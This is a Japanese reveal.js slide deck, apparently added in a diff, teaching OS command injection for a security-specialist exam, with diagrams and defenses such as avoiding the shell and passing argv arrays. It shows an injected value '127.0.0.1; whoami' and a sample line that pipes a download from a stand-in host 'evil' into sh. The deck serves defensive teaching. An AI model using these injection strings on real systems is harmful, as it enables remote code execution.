@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8" />
+  <title>第14回 OSコマンドインジェクション — Reveal（generate-video 用）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reset.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/dracula.min.css" id="theme" />
+  <style>
+    .reveal section { text-align: left; overflow: visible; }
+    .reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+    .reveal .slides { font-size: 0.82em; }
+    .reveal .slides section { padding: 0.15em 0.3em; }
+    .reveal .slides h3 { font-size: 1.12em; line-height: 1.22; margin-bottom: 0.32em; color: #fdba74; }
+    :root { --a: #fdba74; --m: #a8b7cc; --ok: #4ade80; --ng: #f87171; --w: #fbbf24; --c: #38bdf8; }
+    .tag {
+      display: inline-block; font-size: 0.88em; font-weight: 800; letter-spacing: 0.06em;
+      color: #0f1419; background: linear-gradient(90deg, #fb923c, #38bdf8);
+      padding: 0.2em 0.5em; border-radius: 4px; margin-bottom: 0.32em;
+    }
+    .diagram {
+      background: rgba(0,0,0,0.3); border-radius: 10px; padding: 0.4em 0.5em; margin: 0.32em 0;
+      border: 1px solid rgba(251, 146, 60, 0.45);
+    }
+    .diagram svg { display: block; max-width: 100%; height: auto; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5em; }
+    @media (max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
+    .rich-box { padding: 0.45em 0.5em; border-radius: 8px; background: rgba(36, 48, 68, 0.55); border: 1px solid rgba(139, 156, 179, 0.3); font-size: 0.98em; line-height: 1.42; }
+    .box-title { font-weight: 700; margin-bottom: 0.25em; font-size: 1.02em; }
+    .theme-ok { border-color: rgba(74, 222, 128, 0.45); }
+    .theme-ok .box-title { color: var(--ok); }
+    .theme-danger { border-color: rgba(248, 113, 113, 0.45); }
+    .theme-danger .box-title { color: var(--ng); }
+    .theme-warn { border-color: rgba(251, 191, 36, 0.4); }
+    .theme-warn .box-title { color: var(--w); }
+    .ph { font-size: 0.93em; color: var(--m); line-height: 1.48; }
+    .ph strong { color: #e2e8f0; }
+    .slide-bullets { font-size: 0.93em; line-height: 1.48; color: #cbd5e1; margin: 0.32em 0 0; padding-left: 1.05em; }
+    .slide-bullets li { margin: 0.22em 0; }
+    .sum-p3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.38em; font-size: 0.88em; margin: 0.38em 0; line-height: 1.38; }
+    code { font-family: ui-monospace, monospace; color: #fed7aa; }
+  </style>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+      <!-- 0: incident -->
+      <section>
+        <span class="tag">導入</span>
+        <h3>接続診断の <code>host=</code> がそのままシェル行に — <span style="color:#fb923c">;</span> で次の命令へ</h3>
+        <p class="ph">①入力にメタ文字 → ②アプリが <code>ping</code> と連結 → ③シェルが一行を解釈して複数コマンド</p>
+        <div class="diagram">
+          <svg viewBox="0 0 760 150" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <marker id="ar14" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#fb923c"/></marker>
+            </defs>
+            <rect x="20" y="28" width="170" height="72" rx="8" fill="#1e293b" stroke="#fb923c" stroke-width="2"/>
+            <text x="105" y="55" text-anchor="middle" fill="#fdba74" font-size="15" font-weight="700" font-family="sans-serif">管理画面</text>
+            <text x="105" y="80" text-anchor="middle" fill="#fecaca" font-size="11" font-family="monospace">127.0.0.1; whoami</text>
+            <path d="M195 64h25" stroke="#fb923c" stroke-width="2.5" marker-end="url(#ar14)"/>
+            <rect x="230" y="28" width="170" height="72" rx="8" fill="#1e293b" stroke="#38bdf8" stroke-width="2"/>
+            <text x="315" y="55" text-anchor="middle" fill="#7dd3fc" font-size="15" font-weight="700" font-family="sans-serif">Webアプリ</text>
+            <text x="315" y="80" text-anchor="middle" fill="#fca5a5" font-size="11" font-family="sans-serif">一行を sh に渡す</text>
+            <path d="M405 64h25" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar14)"/>
+            <rect x="440" y="22" width="300" height="88" rx="8" fill="#0f172a" stroke="#64748b" stroke-width="2"/>
+            <text x="590" y="48" text-anchor="middle" fill="#94a3b8" font-size="13" font-weight="700" font-family="sans-serif">OS / シェル</text>
+            <text x="590" y="78" text-anchor="middle" fill="#bae6fd" font-size="11" font-family="sans-serif">ping のあと <tspan fill="#fecaca">; whoami …</tspan> も実行されうる</text>
+            <text x="380" y="130" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="sans-serif">第13回はファイル open／今回はシェル経由の <tspan fill="#fdba74" font-weight="700">実行</tspan></text>
+          </svg>
+        </div>
+      </section>
+
+      <!-- 1: opening -->
+      <section>
+        <span class="tag">第14回</span>
+        <h3>【登録セキスペ 第14回】OSコマンドインジェクション</h3>
+        <p class="ph">第13回は <strong>ファイルを開くパス</strong>。今回は <strong>シェルが一行を解釈してプロセス起動</strong>。<code>|</code> <code>;</code> などで命令が連なる。</p>
+        <ul class="slide-bullets">
+          <li>試験の軸：シェル非使用・argv 分離・メタ文字・SQLi / SSRF / 第13回との切り分け</li>
+          <li>図の見方：アプリ → シェル → OS のどこで壊れるか</li>
+        </ul>
+        <p class="ph" style="font-size:0.88em; margin-top:0.35em;">学習用フル図解: s01-ep14-command-injection-study-slides.html</p>
+      </section>
+
+      <!-- 2: concept_shell -->
+      <section>
+        <span class="tag">3段階</span>
+        <h3>Webアプリ → <span style="color:#fde68a">シェル</span>（sh / cmd）→ OS</h3>
+        <div class="diagram">
+          <svg viewBox="0 0 720 100" xmlns="http://www.w3.org/2000/svg">
+            <rect x="10" y="18" width="200" height="70" rx="8" fill="#1e293b" stroke="#fb923c" stroke-width="2"/>
+            <text x="110" y="48" text-anchor="middle" fill="#fdba74" font-size="15" font-weight="700" font-family="sans-serif">① アプリ</text>
+            <text x="110" y="72" text-anchor="middle" fill="#e7edf4" font-size="11" font-family="sans-serif">文字列結合</text>
+            <text x="235" y="58" text-anchor="middle" fill="#94a3b8" font-size="20">→</text>
+            <rect x="270" y="18" width="200" height="70" rx="8" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+            <text x="370" y="48" text-anchor="middle" fill="#fde68a" font-size="15" font-weight="700" font-family="sans-serif">② シェル</text>
+            <text x="370" y="72" text-anchor="middle" fill="#e7edf4" font-size="11" font-family="sans-serif">区切り・パイプ解釈</text>
+            <text x="495" y="58" text-anchor="middle" fill="#94a3b8" font-size="20">→</text>
+            <rect x="510" y="18" width="200" height="70" rx="8" fill="#1e293b" stroke="#4ade80" stroke-width="2"/>
+            <text x="610" y="48" text-anchor="middle" fill="#86efac" font-size="15" font-weight="700" font-family="sans-serif">③ OS</text>
+            <text x="610" y="72" text-anchor="middle" fill="#e7edf4" font-size="11" font-family="sans-serif">プロセス起動</text>
+          </svg>
+        </div>
+        <p class="ph" style="margin-top:0.3em;">対策の本命は <strong>②を経由しない</strong>（exec + argv）。「サニタイズしたから安全」より試験ではシェル非使用が正解側。</p>
+      </section>
+
+      <!-- 3: concat_problem -->
+      <section>
+        <span class="tag">欠陥の核</span>
+        <h3>固定文字列 + 入力 を <strong>1本のシェル行</strong> にする — が典型</h3>
+        <div class="grid-2" style="margin-top:0.35em;">
+          <div class="rich-box theme-danger"><div class="box-title">危険</div> <code>sh -c "ping … "+input</code> 型。クォートはみ出しも頻出。</div>
+          <div class="rich-box theme-ok"><div class="box-title">望ましい</div> argv[0]=ping, argv[1]=… の<strong>配列渡し</strong>。シェル不在。</div>
+        </div>
+        <p class="ph" style="margin-top:0.35em; font-size:0.95em;">記述問題では「エスケープ追加」より「<strong>起動方法の変更</strong>」が高得点ラインになりやすい。</p>
+      </section>
+
+      <!-- 4: metacharacters -->
+      <section>
+        <span class="tag">メタ文字</span>
+        <h3><code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>||</code> <code>`…`</code> <code>$()</code> — 一行に複数の文</h3>
+        <div class="diagram" style="padding:0.35em 0.5em;">
+          <p style="font-family:monospace; color:#fecaca; font-size:0.95em; margin:0;">ping 127.0.0.1 ; curl http://evil/x | sh</p>
+          <p class="ph" style="margin:0.35em 0 0; font-size:0.92em;">記号の暗記より「シェルに一行渡すな」が本質。禁止リストは迂回されやすい。</p>
+        </div>
+      </section>
+
+      <!-- 5: blind_output -->
+      <section>
+        <span class="tag">ブラインド</span>
+        <h3>画面に出なくても — 遅延・外向きHTTP・DNS 等で実行を推測</h3>
+        <ul class="slide-bullets">
+          <li>対策の本質は同じ：<strong>シェル経由の任意実行を許さない</strong></li>
+        </ul>
+      </section>
+
+      <!-- 6: surfaces -->
+      <section>
+        <span class="tag">発生箇所</span>
+        <h3>ping / nslookup、ffmpeg、バッチ呼び出し — 「CLIを便利に」ほどハマる</h3>
+        <ul class="slide-bullets" style="font-size:0.92em;">
+          <li><strong>診断</strong>：管理画面に露出しがち</li>
+          <li><strong>メディア</strong>：ファイル名・パスに入力が混ざる</li>
+          <li><strong>メンテ</strong>：HTTP パラメータが引数に直結</li>
+        </ul>
+      </section>
+
+      <!-- 7: defense_no_shell -->
+      <section>
+        <span class="tag">対策①</span>
+        <h3>シェルを起動しない — execve 系で <strong>argv 配列</strong></h3>
+        <div class="grid-2">
+          <div class="rich-box theme-ok"><div class="box-title">推奨</div> コマンドパス固定・引数は第二引数以降</div>
+          <div class="rich-box theme-danger"><div class="box-title">避ける</div> 文字列一本で渡す API（言語により名称不同）</div>
+        </div>
+        <p class="ph" style="margin-top:0.35em;">同じ ping でも、呼び方で安全性が変わる — 試験の定番。</p>
+      </section>
+
+      <!-- 8: defense_design -->
+      <section>
+        <span class="tag">対策②</span>
+        <h3>機能を狭める・ネットワーク分離・低権限・コンテナ</h3>
+        <ul class="slide-bullets">
+          <li>任意ホストへの ping を公開しない／VPN・管理者のみ など</li>
+          <li>WAF 万能論・禁止文字だけ、より <strong>機能削減・権限最小化</strong> が並ぶ</li>
+        </ul>
+      </section>
+
+      <!-- 9: defense_whitelist -->
+      <section>
+        <span class="tag">対策③</span>
+        <h3>入力を受けるなら <strong>ホワイトリスト</strong>＋形式検証</h3>
+        <p class="ph">危険文字の列挙より「許可する形だけ」。ホスト名なら FQDN 文法 + 解決先の許可リスト、など。最後の砦はやはりシェル非使用。</p>
+      </section>
+
+      <!-- 10: compare_axes -->
+      <section>
+        <span class="tag">混同ゼロ</span>
+        <h3>入力が効く「エンジン」で切る</h3>
+        <ul class="slide-bullets" style="font-size:0.92em;">
+          <li><strong>OSコマンド注入</strong>：シェル／OS が実行</li>
+          <li><strong>SQLi（5回）</strong>：DB がクエリを誤解釈</li>
+          <li><strong>SSRF（11回）</strong>：サーバが HTTP で取りに行く</li>
+          <li><strong>パストラ（13回）</strong>：ローカルファイル読取 — 実行とは別軸</li>
+        </ul>
+      </section>
+
+      <!-- 11: exam_tips -->
+      <section>
+        <span class="tag">試験</span>
+        <h3>短絡しやすい誤答パターン</h3>
+        <ul class="slide-bullets" style="font-size:0.96em;">
+          <li>① エスケープだけあれば絶対安全 — 抜け道の話が教科書に載る</li>
+          <li>② WAF があればコマンド注入も丸ごと防げる — レイヤが違う</li>
+          <li>③ 第13回の対策をそのまま当てはめる — 読取と実行は別</li>
+        </ul>
+      </section>
+
+      <!-- 12: summary -->
+      <section>
+        <span class="tag">まとめ</span>
+        <h3>第14回: OSコマンドインジェクション</h3>
+        <div class="sum-p3" style="color:#cbd5e1;">
+          <div style="background:rgba(0,0,0,0.3); border-radius:8px; padding:0.45em; border:1px solid rgba(251,146,60,0.35);"><b style="color:#fdba74;">1</b><br>一行のシェル文法に<br>入力が載る</div>
+          <div style="background:rgba(0,0,0,0.3); border-radius:8px; padding:0.45em; border:1px solid rgba(251,146,60,0.35);"><b style="color:#fdba74;">2</b><br>シェル非使用<br>argv で分離</div>
+          <div style="background:rgba(0,0,0,0.3); border-radius:8px; padding:0.45em; border:1px solid rgba(251,146,60,0.35);"><b style="color:#fdba74;">3</b><br>機能・権限を<br>減らす</div>
+        </div>
+        <p style="font-size:0.88em; color:#e2e8f0; line-height:1.48; margin-top:0.35em;">第13回：パスで open／第14回：シェルで run。</p>
+        <p style="font-size:0.82em; color:#94a3b8;">学習スライド: s01-ep14-command-injection-study-slides.html</p>
+      </section>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+  <script>
+    Reveal.initialize({ hash: true, slideNumber: "c/t", transition: "none", width: 1280, height: 720, margin: 0.04 });
+  </script>
+</body>
+</html>
